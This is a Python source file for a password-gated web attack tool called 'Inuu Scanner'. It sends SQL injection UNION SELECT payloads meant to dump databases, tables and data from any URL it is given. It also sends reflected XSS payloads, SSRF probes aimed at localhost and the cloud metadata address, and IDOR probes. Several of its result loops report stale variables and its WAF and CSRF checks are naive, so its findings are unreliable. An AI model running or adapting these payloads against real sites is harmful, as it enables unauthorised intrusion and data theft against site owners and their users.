import base64
import requests
import sys
import time
import os
import re
import logging
from concurrent.futures import ThreadPoolExecutor

# ANSI color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    OKCYAN = '\033[96m'

# Base64 encoded password
encoded_correct_password = 'aW51dV9nYW50ZW5n'  # Base64 encoded 'inuu_ganteng'

def setup_logging():
    logging.basicConfig(filename='scanner.log', level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

def print_intro():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear terminal screen

    intro_text = [
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}██████      ████████  ████████   ████████████████████████████████████  ████████      ████{Colors.ENDC}",
        f"{Colors.OKBLUE}██████      ██        ██                ██                   ██                ██      ████{Colors.ENDC}",
        f"{Colors.OKBLUE}██████      ██   ████   ████   ████████  ████  ████████    ██   ████████  ████      ████{Colors.ENDC}",
        f"{Colors.OKBLUE}██████      ██     ██        ██    ██       ██        ██  ██      ██    ██       ████{Colors.ENDC}",
        f"{Colors.OKBLUE}██████      ██     ██        ██    ██       ██        ██  ██      ██    ██       ████{Colors.ENDC}",
        f"{Colors.OKBLUE}██████      ████████   ████████   ████████  ████████████   ████████   ████████      ████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKBLUE}█████████████████████████████████████████████████████████████████████████████████████{Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████                               ████               {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████       ████████   ████████    ████   ████████    {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████       ██    ██   ██    ██    ████   ██        {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████       ██    ██   ██    ██    ████   ██        {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████       ████████   ████████    ████   ████████    {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████                               ████               {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████                               ████               {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████                               ████               {Colors.ENDC}",
        f"{Colors.OKCYAN}                                  ████                               ████               {Colors.ENDC}",
    ]

    for line in intro_text:
        print(line)
        time.sleep(0.05)  # Simulate typing effect

    print(f"\n{Colors.OKGREEN}Welcome to Inuu Scanner{Colors.ENDC}")
    time.sleep(1)
    print(f"{Colors.OKGREEN}The ultimate tool for detecting vulnerabilities with style and precision.{Colors.ENDC}")
    time.sleep(1)
    print(f"{Colors.OKGREEN}Initializing...{Colors.ENDC}")
    time.sleep(1)

def check_password():
    attempts_left = 3
    while attempts_left > 0:
        user_password = input("Please enter the password to access the scanner:\nPassword: ")
        encoded_user_password = base64.b64encode(user_password.encode()).decode()
        if encoded_user_password == encoded_correct_password:
            print("Access granted.")
            return True
        else:
            attempts_left -= 1
            print(f"{Colors.FAIL}Incorrect password. Attempts left: {attempts_left}{Colors.ENDC}")
    print(f"{Colors.FAIL}Access denied. Too many failed attempts.{Colors.ENDC}")
    return False

def execute_sql_injection(url, payload):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    }
    try:
        response = requests.get(url, params={'id': payload}, headers=headers)
        if response.status_code == 200:
            if "error" in response.text or "database" in response.text:
                return True, response.text
    except requests.RequestException as e:
        logging.error(f"Error: {e}")
    return False, None

def identify_database(response_text):
    if "MySQL" in response_text:
        return 'MySQL'
    elif "PostgreSQL" in response_text:
        return 'PostgreSQL'
    elif "SQLite" in response_text:
        return 'SQLite'
    elif "Django" in response_text:
        return 'Django'
    else:
        return 'Unknown'

def auto_exploit_sql(url):
    db_types = {
        'mysql': {
            'version': "' UNION SELECT @@version --",
            'databases': "' UNION SELECT schema_name FROM information_schema.schemata --",
            'tables': "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database' --",
            'columns': "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='table_name' --",
            'data': "' UNION SELECT group_concat(column_name) FROM table_name --"
        },
        'postgresql': {
            'version': "' UNION SELECT version() --",
            'databases': "' UNION SELECT datname FROM pg_database --",
            'tables': "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' --",
            'columns': "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='table_name' --",
            'data': "' UNION SELECT string_agg(column_name, ',') FROM table_name --"
        },
    }

    results = []
    severity_levels = {
        'version': 'Low',
        'databases': 'Medium',
        'tables': 'High',
        'columns': 'High',
        'data': 'Critical'
    }

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for db_type, payloads in db_types.items():
            for key, payload in payloads.items():
                futures.append(executor.submit(execute_sql_injection, url, payload))

        for future in futures:
            success, response = future.result()
            if success:
                db_name = identify_database(response)
                description = f'{key.capitalize()} information retrieved'
                if key == 'data':
                    data_result = re.findall(r'(\w+)', response)
                    response = ', '.join(data_result)
                results.append({
                    'type': 'SQL Injection',
                    'url': url,
                    'severity': severity_levels.get(key, 'Unknown'),
                    'description': description,
                    'database': db_name
                })
            else:
                results.append({
                    'type': 'SQL Injection',
                    'url': url,
                    'severity': 'N/A',
                    'description': f'{key.capitalize()} information not found',
                    'database': 'N/A'
                })

    return results

def check_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "javascript:alert('XSS')"
    ]
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(requests.get, url, params={'q': payload}) for payload in payloads]
        
        for future in futures:
            response = future.result()
            if any(payload in response.text for payload in payloads):
                results.append({
                    'type': 'Reflected XSS',
                    'url': url,
                    'severity': 'High',
                    'description': f'Reflected XSS vulnerability detected with payload: {payload}'
                })
    return results

def check_idor(url):
    parameters = ['id', 'user_id', 'product_id', 'order_id']
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for param in parameters:
            for payload in ['1', '2', '10000', '99999']:
                futures.append(executor.submit(requests.get, url, params={param: payload}))
        
        for future in futures:
            response = future.result()
            if response.status_code == 200 and "unauthorized" not in response.text:
                results.append({
                    'type': 'Insecure Direct Object Reference (IDOR)',
                    'url': url,
                    'severity': 'Medium',
                    'description': f'Potential IDOR vulnerability detected with parameter: {param} and payload: {payload}'
                })
    return results

def check_csrftoken(url):
    try:
        response = requests.get(url)
        if 'csrf' in response.text.lower():
            return [{
                'type': 'CSRF Token',
                'url': url,
                'severity': 'Medium',
                'description': 'CSRF token found on the page, further analysis needed.'
            }]
        return []
    except requests.RequestException as e:
        logging.error(f"Error: {e}")
        return []

def check_ssrf(url):
    payloads = [
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/"
    ]
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(requests.get, url, params={'url': payload}) for payload in payloads]
        
        for future in futures:
            response = future.result()
            if response.status_code == 200 and "localhost" in response.text:
                results.append({
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'url': url,
                    'severity': 'High',
                    'description': f'SSRF vulnerability detected with payload: {payload}'
                })
    return results

def check_waf(url):
    waf_signatures = [
        "Security Header",
        "WAF detected",
        "Firewall"
    ]
    results = []
    try:
        response = requests.get(url)
        if any(signature in response.text for signature in waf_signatures):
            results.append({
                'type': 'Web Application Firewall (WAF)',
                'url': url,
                'severity': 'Medium',
                'description': 'WAF detected in the response.'
            })
    except requests.RequestException as e:
        logging.error(f"Error: {e}")
    return results

def scan(url):
    print(f"{Colors.OKGREEN}Scanning {url}...{Colors.ENDC}")
    
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [
            executor.submit(auto_exploit_sql, url),
            executor.submit(check_xss, url),
            executor.submit(check_idor, url),
            executor.submit(check_csrftoken, url),
            executor.submit(check_ssrf, url),
            executor.submit(check_waf, url)
        ]
        
        for future in futures:
            results.extend(future.result())

    return results

def display_results(results):
    if not results:
        print(f"{Colors.OKGREEN}No vulnerabilities found.{Colors.ENDC}")
        return

    for result in results:
        color = Colors.OKGREEN
        if result['severity'] == 'Critical':
            color = Colors.FAIL
        elif result['severity'] == 'High':
            color = Colors.WARNING
        elif result['severity'] == 'Medium':
            color = Colors.OKCYAN
        else:
            color = Colors.OKGREEN
        
        print(f"\n{color}{Colors.BOLD}Type:{Colors.ENDC} {result['type']}")
        print(f"{color}{Colors.BOLD}URL:{Colors.ENDC} {result['url']}")
        print(f"{color}{Colors.BOLD}Severity:{Colors.ENDC} {result['severity']}")
        print(f"{color}{Colors.BOLD}Description:{Colors.ENDC} {result['description']}")
        print(f"{color}{Colors.BOLD}Database:{Colors.ENDC} {result.get('database', 'N/A')}")
        
    print(f"\n{Colors.OKBLUE}Scan complete.{Colors.ENDC}")

def main():
    setup_logging()
    print_intro()
    
    if not check_password():
        return

    while True:
        # Jika URL tidak diberikan sebagai argumen, minta URL dari pengguna
        if len(sys.argv) != 2:
            url = input("Please enter the URL to scan: ").strip()
        else:
            url = sys.argv[1]

        results = scan(url)
        display_results(results)

        choice = input(f"\n{Colors.OKCYAN}Do you want to scan another URL? (y/n): {Colors.ENDC}").strip().lower()
        if choice != 'y':
            print(f"{Colors.OKGREEN}Exiting...{Colors.ENDC}")
            break

if __name__ == "__main__":
    main()
